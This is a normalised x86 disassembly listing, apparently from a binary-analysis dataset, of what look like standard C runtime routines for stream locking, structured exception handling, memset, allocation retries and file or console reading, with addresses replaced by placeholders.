pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_4118b8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_41569d
mov eax [ ebp + 0xc ]
pop ecx
or [ eax + 0xc ] 0x8000
pop ebp
retn
sub_4118e8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_415801
pop ecx
pop ebp
retn
sub_411922
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
lea eax [ ecx + 0x10 ]
push eax
call sub_415801
pop ecx
pop ebp
retn
sub_41194f
push 0x10
push r--data
call sub_411a70
xor ebx ebx
mov esi ebx
mov [ ebp - 0x1c ] esi
push 0x1
call sub_41569d
pop ecx
mov [ ebp - 0x4 ] ebx
mov edi ebx
test esi esi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_411a5e
mov eax esi
call sub_411ab5
retn
and [ esi + 0xc ] 0x8000
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi ] ebx
mov [ esi + 0x1c ] ebx
or [ esi + 0x10 ] 0xffffffff
push 0x38
call sub_412014
pop ecx
mov ecx eax
mov eax [ rw-data ]
mov [ eax + edi * 4 ] ecx
test ecx ecx
je r-xdata
test [ eax + 0xc ] 0x83
jne r-xdata
push 0xfa0
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
add eax 0x20
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov esi [ eax + edi * 4 ]
mov [ ebp - 0x1c ] esi
mov [ esi + 0xc ] ebx
inc edi
jmp r-xdata
test [ eax + 0xc ] 0x8000
jne r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
lea eax [ edi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
push [ eax + edi * 4 ]
push edi
call sub_4118b8
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ edi + 0x10 ]
push eax
call sub_415725
pop ecx
test eax eax
je r-xdata
mov esi eax
mov [ ebp - 0x1c ] esi
jmp r-xdata
push eax
push edi
call sub_411922
pop ecx
pop ecx
sub_411a70
push sub_411ad0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_411ad0
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebx + 0x8 ]
xor edi [ rw-data ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
mov eax [ edi ]
lea esi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x8 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_40f682
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_40f682
cmp [ ebx + 0xc ] 0xfffffffe
je r-xdata
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebx - 0x4 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x8 ] eax
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push esi
mov ecx ebx
mov edx 0xfffffffe
call sub_411dab
lea eax [ eax + eax * 2 ]
lea eax [ eax + 0x4 ]
mov ecx [ edi + eax * 4 + 0x4 ]
mov ebx [ edi + eax * 4 ]
lea eax [ edi + eax * 4 ]
mov [ ebp - 0x10 ] eax
test ecx ecx
je r-xdata
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x8 ]
add ecx esi
xor ecx [ edx + esi ]
call sub_40f682
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_40f682
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_411d62
mov cl 0x1
mov [ ebp - 0x1 ] cl
test eax eax
js r-xdata
test cl cl
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jle r-xdata
jmp r-xdata
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
mov eax ebx
mov [ ebp - 0x8 ] ebx
cmp ebx 0xfffffffe
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_411d92
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
cmp [ eax + 0xc ] edx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push esi
mov ecx eax
call sub_411dab
mov eax [ ebp + 0xc ]
push r--data
call sub_415870
add esp 0x4
test eax eax
je r-xdata
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x8 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_40f682
mov ecx [ ebp - 0x10 ]
mov edx esi
mov ecx [ ecx + 0x8 ]
call sub_411d79
int3
jmp r-xdata
push 0x1
push [ ebp + 0x8 ]
call [ r--data ]
add esp 0x8
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_40f682
sub_411c70
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_411d00
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_417025
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_417044
jmp r-xdata
sub_411d00
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_40f682
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_411c70
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_411d62
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_411d92
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_411dc2
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
push esi
call sub_4121ca
pop ecx
mov ecx [ esi + 0xc ]
mov edi eax
test cl 0x82
jne r-xdata
test cl 0x40
je r-xdata
call sub_410eb4
mov [ eax ] 0x9
push ebx
xor ebx ebx
test cl 0x1
je r-xdata
call sub_410eb4
mov [ eax ] 0x22
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test cl 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
je r-xdata
call sub_411873
add eax 0x20
cmp esi eax
je r-xdata
or ecx 0x20
mov [ esi + 0xc ] ecx
jmp r-xdata
mov eax [ esi + 0x8 ]
and ecx 0xfffffffe
mov [ esi ] eax
mov [ esi + 0xc ] ecx
xor eax eax
inc eax
push eax
mov [ ebp + 0xc ] eax
lea eax [ ebp + 0x8 ]
push eax
push edi
call sub_413254
add esp 0xc
mov ebx eax
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
lea eax [ edx + 0x1 ]
mov [ esi ] eax
mov eax [ esi + 0x18 ]
sub ecx edx
dec eax
mov [ ebp + 0xc ] ecx
mov [ esi + 0x4 ] eax
test ecx ecx
jle r-xdata
push edi
call sub_417047
pop ecx
test eax eax
jne r-xdata
call sub_411873
add eax 0x40
cmp esi eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
movzx eax [ ebp + 0x8 ]
or [ esi + 0xc ] 0x20
cmp edi 0xffffffff
je r-xdata
push ecx
push edx
push edi
call sub_413254
add esp 0xc
mov ebx eax
jmp r-xdata
push esi
call sub_41709b
pop ecx
pop ebx
mov ecx rw-data
cmp edi 0xfffffffe
je r-xdata
mov ecx [ esi + 0x8 ]
mov al [ ebp + 0x8 ]
mov [ ecx ] al
jmp r-xdata
push 0x2
push ebx
push ebx
push edi
call sub_413e4b
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov ecx edi
mov eax edi
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
add ecx [ eax * 4 + rw-data ]
jmp r-xdata
cmp ebx [ ebp + 0xc ]
je r-xdata
test [ ecx + 0x4 ] 0x20
je r-xdata
sub_411f0f
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] 0x0
test ecx ecx
jne r-xdata
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_414adf
mov edx eax
mov [ esi + 0x8 ] edx
mov ecx [ edx + 0x6c ]
mov [ esi ] ecx
mov ecx [ edx + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
test [ edx + 0x70 ] eax
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ ecx + 0x70 ]
test al 0x2
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ rw-data ]
test [ ecx + 0x70 ] eax
jne r-xdata
call sub_417366
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or eax 0x2
mov [ ecx + 0x70 ] eax
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_415ef2
mov [ esi + 0x4 ] eax
sub_411f97
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_410eb4
mov [ eax ] 0x16
call sub_41179e
or eax 0xffffffff
pop ebp
retn
sub_411fca
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea ecx [ esi + 0x3e8 ]
mov esi ecx
cmp ecx [ rw-data ]
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4176c0
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_412014
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ rw-data ]
xor esi esi
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test edi edi
je r-xdata
push esi
call [ Sleep@IAT ]
mov edi [ rw-data ]
lea ecx [ esi + 0x3e8 ]
mov esi ecx
cmp ecx edi
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push [ ebp + 0x8 ]
call sub_40f6c9
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
sub_41205d
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
mov esi eax
cmp eax [ rw-data ]
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417615
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_4120a9
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
mov eax [ edi + 0xc ]
test al 0x83
je r-xdata
call sub_410eb4
mov [ eax ] 0x16
call sub_41179e
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ edi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ edi + 0x8 ]
mov [ edi ] eax
push edi
call sub_41709b
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ edi + 0xc ] eax
and [ edi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ edi + 0x18 ]
push [ edi + 0x8 ]
push edi
call sub_4121ca
pop ecx
push eax
call sub_412300
add esp 0xc
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
test [ edi + 0xc ] 0x82
jne r-xdata
cmp [ edi + 0x18 ] 0x200
jne r-xdata
push edi
call sub_4121ca
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ edi ]
dec [ edi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ edi ] ecx
jmp r-xdata
test [ edi + 0xc ] 0x8
je r-xdata
mov eax rw-data
push edi
call sub_4121ca
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop ebp
retn
test [ edi + 0xc ] 0x400
jne r-xdata
or [ edi + 0xc ] 0x2000
push esi
push edi
call sub_4121ca
mov esi eax
push edi
sar esi 0x5
call sub_4121ca
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ esi * 4 + rw-data ]
pop ecx
pop esi
jmp r-xdata
mov [ edi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_4121ca
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_410eb4
mov [ eax ] 0x16
call sub_41179e
or eax 0xffffffff
pop ebp
retn
sub_4121ee
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
call sub_410eb4
push 0x16
pop esi
mov [ eax ] esi
call sub_41179e
mov eax esi
jmp r-xdata
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push eax
call sub_412270
add esp 0xc
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
call sub_410eb4
push 0x16
jmp r-xdata
push esi
push edi
push eax
call sub_412c10
add esp 0xc
xor eax eax
jmp r-xdata
push 0x16
pop eax
call sub_410eb4
push 0x22
pop esi
mov [ eax ] esi
call sub_41179e
mov eax esi
jmp r-xdata
pop edi
sub_412270
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
movzx eax [ esp + 0x8 ]
bt [ rw-data ] 0x1
jae r-xdata
mov edx [ esp + 0xc ]
cmp edx 0x80
jl r-xdata
mov ecx [ esp + 0xc ]
push edi
mov edi [ esp + 0x8 ]
[ edi ]
jmp r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
test eax eax
jne r-xdata
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
movd xmm0 eax
punpcklbw xmm0 xmm0
punpcklwd xmm0 xmm0
pshufd xmm0 xmm0 0x0
pxor xmm0 xmm0
jmp r-xdata
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
neg ebx
add ebx 0x10
sub edx ebx
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov ebx edx
and edx 0x7f
shr ebx 0x7
je r-xdata
push ebx
push ecx
mov ebx ecx
and ebx 0xf
test ebx ebx
jne r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec ebx
jne r-xdata
pop edx
jmp r-xdata
movd [ ecx ] xmm0
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop eax
pop ebx
retn
mov ebx edx
shr ebx 0x4
je r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov ebx edx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec ebx
jne r-xdata
and ebx 0x3
je r-xdata
movd [ ecx ] xmm0
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] al
inc ecx
dec ebx
jne r-xdata
sub_412300
push 0x10
push r--data
call sub_411a70
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_410e80
and [ eax ] 0x0
call sub_410eb4
mov [ eax ] 0x9
jmp r-xdata
call sub_410e80
and [ eax ] 0x0
call sub_410eb4
mov [ eax ] 0x9
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
mov eax 0x7fffffff
cmp eax [ ebp + 0x10 ]
sbb eax eax
inc eax
jne r-xdata
push esi
call sub_417802
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_410e80
and [ eax ] 0x0
call sub_410eb4
mov [ eax ] 0x16
jmp r-xdata
call sub_410eb4
mov [ eax ] 0x9
call sub_410e80
and [ eax ] 0x0
or edi 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_412408
add esp 0xc
mov edi eax
jmp r-xdata
call sub_41179e
call sub_411ab5
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4123df
mov eax edi
jmp r-xdata
sub_412408
push ebp
mov ebp esp
sub esp 0x28
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
push 0xfffffffe
pop ecx
xor edi edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x28 ] esi
cmp eax ecx
jne r-xdata
test eax eax
js r-xdata
call sub_410e80
mov [ eax ] edi
call sub_410eb4
mov [ eax ] 0x9
jmp r-xdata
call sub_410e80
mov [ eax ] edi
call sub_410eb4
mov [ eax ] 0x9
cmp eax [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ecx eax
sar ecx 0x5
mov ebx eax
mov edx [ ecx * 4 + rw-data ]
and ebx 0x1f
shl ebx 0x6
mov [ ebp - 0xc ] ecx
mov al [ edx + ebx + 0x4 ]
mov [ ebp - 0x24 ] ebx
test al 0x1
je r-xdata
cmp esi 0x7fffffff
jbe r-xdata
test esi esi
je r-xdata
call sub_410e80
mov [ eax ] edi
xor eax eax
jmp r-xdata
test al 0x2
jne r-xdata
call sub_41179e
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] edi
jne r-xdata
mov al [ edx + ebx + 0x24 ]
add al al
sar al 0x1
mov [ ebp + 0x13 ] al
movsx eax al
dec eax
je r-xdata
call sub_410e80
and [ eax ] edi
jmp r-xdata
mov eax esi
not eax
test al 0x1
je r-xdata
dec eax
jne r-xdata
call sub_410eb4
mov [ eax ] 0x16
jmp r-xdata
shr esi 0x1
cmp esi 0x4
jae r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax esi
not eax
test al 0x1
je r-xdata
push esi
call sub_412014
pop ecx
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
push 0x4
pop esi
mov edx [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0xc ]
test [ edx + ebx + 0x4 ] 0x48
mov [ ebp - 0x1c ] eax
je r-xdata
and esi 0xfffffffe
push 0x1
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_413f47
mov ecx [ ebp - 0xc ]
add esp 0x10
mov ecx [ ecx * 4 + rw-data ]
mov [ ecx + ebx + 0x28 ] eax
mov eax [ ebp - 0x10 ]
mov [ ecx + ebx + 0x2c ] edx
mov ecx [ ebp - 0xc ]
call sub_410eb4
mov [ eax ] 0xc
call sub_410e80
mov [ eax ] 0x8
jmp r-xdata
push [ ebp + 0x8 ]
call sub_417047
test eax eax
mov eax [ ebp - 0xc ]
pop ecx
je r-xdata
mov dl [ edx + ebx + 0x5 ]
cmp dl 0xa
je r-xdata
mov eax [ eax * 4 + rw-data ]
push 0x0
lea ecx [ ebp - 0x14 ]
push ecx
push esi
push [ ebp - 0x1c ]
push [ eax + ebx ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov ecx [ eax * 4 + rw-data ]
test [ ecx + ebx + 0x4 ] 0x80
je r-xdata
test esi esi
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x14 ]
test ecx ecx
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push [ ecx + ebx ]
call [ GetConsoleMode@IAT ]
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ eax ] dl
xor edi edi
lea edx [ eax + 0x1 ]
mov eax [ ecx * 4 + rw-data ]
inc edi
dec esi
cmp [ ebp + 0x13 ] 0x0
mov [ ebp - 0x1c ] edx
mov [ eax + ebx + 0x5 ] 0xa
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_410eb4
mov [ eax ] 0x9
call sub_410e80
mov [ eax ] esi
jmp r-xdata
cmp ecx esi
ja r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x13 ] 0x2
jne r-xdata
mov eax [ ecx * 4 + rw-data ]
mov al [ eax + ebx + 0x25 ]
cmp al 0xa
je r-xdata
push eax
call sub_410e93
pop ecx
xor ebx ebx
jmp r-xdata
or ebx 0xffffffff
mov edx [ ebp - 0xc ]
add edi ecx
mov esi [ edx * 4 + rw-data ]
mov al [ esi + ebx + 0x4 ]
test al al
jns r-xdata
push 0x0
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0xc ]
shr esi 0x1
mov eax [ eax * 4 + rw-data ]
push esi
push [ ebp - 0x1c ]
push [ eax + ebx ]
call [ ReadConsoleW@IAT ]
test eax eax
jne r-xdata
test esi esi
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x13 ] 0x2
je r-xdata
mov eax [ ebp - 0x14 ]
lea ecx [ eax + eax ]
mov [ ebp - 0x14 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ edx ] al
mov eax [ ecx * 4 + rw-data ]
inc edx
push 0x2
dec esi
cmp [ ebp + 0x13 ] 0x1
mov [ ebp - 0x1c ] edx
pop edi
mov [ eax + ebx + 0x25 ] 0xa
jne r-xdata
cmp ebx 0xfffffffe
je r-xdata
push eax
call sub_40f691
pop ecx
cmp [ ebp - 0x20 ] 0x0
je r-xdata
test ecx ecx
je r-xdata
mov eax [ ecx * 4 + rw-data ]
mov al [ eax + ebx + 0x26 ]
cmp al 0xa
je r-xdata
mov eax edi
jmp r-xdata
mov edi ebx
test ecx ecx
je r-xdata
mov esi [ ebp - 0x10 ]
mov eax edi
cdq
sub eax edx
sar eax 0x1
mov edi esi
mov ecx esi
lea edx [ edi + eax * 2 ]
cmp edi edx
jae r-xdata
and al 0xfb
mov ecx [ ebp - 0x10 ]
cmp [ ecx ] 0xa
jne r-xdata
test esi esi
je r-xdata
and al 0xfb
mov ecx [ ebp - 0x10 ]
push 0xa
pop edx
cmp [ ecx ] dx
mov edx [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edi esi
sub edi eax
and edi 0xfffffffe
jmp r-xdata
push 0xd
mov [ ebp + 0x10 ] 0x1a
pop edi
mov eax [ ebp - 0x10 ]
mov edi esi
sub edi eax
cmp [ ebp + 0x13 ] 0x1
jne r-xdata
push 0xd
pop ecx
mov edi eax
or al 0x4
jmp r-xdata
push 0x3
pop edi
mov [ edx ] al
mov eax [ ecx * 4 + rw-data ]
push 0xa
inc edx
pop ecx
mov [ ebp - 0x1c ] edx
dec esi
mov [ eax + ebx + 0x26 ] cl
mov eax [ ebp - 0x10 ]
mov edi esi
sub edi eax
jmp r-xdata
push 0xd
pop ecx
mov [ ebp + 0x10 ] 0x1a
mov edi eax
or al 0x4
jmp r-xdata
mov ebx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
mov eax [ eax * 4 + rw-data ]
or [ eax + ebx + 0x4 ] 0x2
cmp ax di
je r-xdata
test edi edi
je r-xdata
mov ecx [ edx * 4 + rw-data ]
mov al [ ecx + ebx + 0x4 ]
test al 0x40
jne r-xdata
cmp al cl
je r-xdata
mov [ esi + ebx + 0x4 ] al
mov eax [ ebp - 0x10 ]
mov esi eax
lea ecx [ eax + edi ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] ecx
cmp eax ecx
jae r-xdata
mov ecx [ edx * 4 + rw-data ]
mov al [ ecx + ebx + 0x4 ]
test al 0x40
jne r-xdata
cmp ax cx
je r-xdata
mov [ esi + ebx + 0x4 ] al
mov eax [ ebp - 0x10 ]
mov esi eax
lea ecx [ eax + edi ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x20 ] ecx
cmp eax ecx
jae r-xdata
lea eax [ edx - 0x2 ]
cmp ecx eax
jae r-xdata
mov [ esi ] ax
add esi 0x2
add ecx 0x2
jmp r-xdata
dec esi
mov al [ esi ]
test al al
js r-xdata
mov al [ edi ]
mov [ esi ] al
inc esi
or al 0x2
mov [ ecx + ebx + 0x4 ] al
jmp r-xdata
mov eax [ ebp - 0x1c ]
dec eax
cmp edi eax
jae r-xdata
mov [ esi ] al
inc esi
inc edi
jmp r-xdata
mov ax [ edi ]
mov [ esi ] ax
add esi 0x2
or al 0x2
mov [ ecx + ebx + 0x4 ] al
jmp r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xfffffffe
cmp edi eax
jae r-xdata
mov [ esi ] ax
jmp r-xdata
cmp ecx edx
jb r-xdata
push 0xa
add ecx 0x2
pop eax
cmp [ ecx ] ax
je r-xdata
movzx eax al
xor edx edx
inc edx
cmp [ eax + rw-data ] 0x0
jne r-xdata
inc esi
jmp r-xdata
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edx * 4 + rw-data ]
inc edi
